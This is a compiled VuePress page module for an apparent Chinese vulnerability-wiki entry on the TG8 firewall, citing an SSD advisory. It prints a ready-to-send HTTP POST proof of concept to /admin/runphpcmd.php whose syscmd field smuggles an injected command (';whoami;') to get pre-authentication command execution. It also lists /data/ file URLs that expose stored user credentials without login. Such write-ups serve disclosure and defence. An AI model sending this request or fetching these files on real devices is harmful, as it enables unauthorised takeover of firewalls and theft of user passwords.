import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as t,c as d,a as e,b as n,d as r,e as l}from"./app-58e4a7d6.js";const c={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),v=e("p",null,"TG8防火墙中存在两个漏洞，远程用户可以以用户身份执行命令而无需通过设备进行身份验证。第二个漏洞允许在不经过身份验证的情况下公开现有用户的密码。",-1),u=e("p",null,"参考链接：",-1),h={href:"https://ssd-disclosure.com/ssd-advisory-tg8-firewall-preauth-rce-and-password-disclosure/",target:"_blank",rel:"noopener noreferrer"},p=l(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="rce" tabindex="-1"><a class="header-anchor" href="#rce" aria-hidden="true">#</a> RCE</h3><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST http://&lt;server&gt;/admin/runphpcmd.php HTTP/1.1
Host: Server
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 68
Connection: keep-alive


syscmd=sudo+%2Fhome%2FTG8%2Fv3%2Fsyscmd%2Fcheck_gui_login.sh+&lt;Payload&gt;++local
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行whoami：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>syscmd=sudo+/home/TG8/v3/syscmd/check_gui_login.sh+;whoami;++local
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="密码泄露" tabindex="-1"><a class="header-anchor" href="#密码泄露" aria-hidden="true">#</a> 密码泄露</h3><p>/data/目录下储存了登录过用户的凭据，无需登录即可访问此目录下的文件。</p><p>例如：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://&lt;server&gt;/data/w-341.tg
http://&lt;server&gt;/data/w-342.tg
http://&lt;server&gt;/data/r-341.tg
http://&lt;server&gt;/data/r-342.tg
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,10);function m(_,g){const a=i("ExternalLinkIcon");return t(),d("div",null,[o,v,u,e("ul",null,[e("li",null,[e("a",h,[n("https://ssd-disclosure.com/ssd-advisory-tg8-firewall-preauth-rce-and-password-disclosure/"),r(a)])])]),p])}const f=s(c,[["render",m],["__file","TG8 防火墙 RCE及密码泄漏漏洞.html.vue"]]);export{f as default};
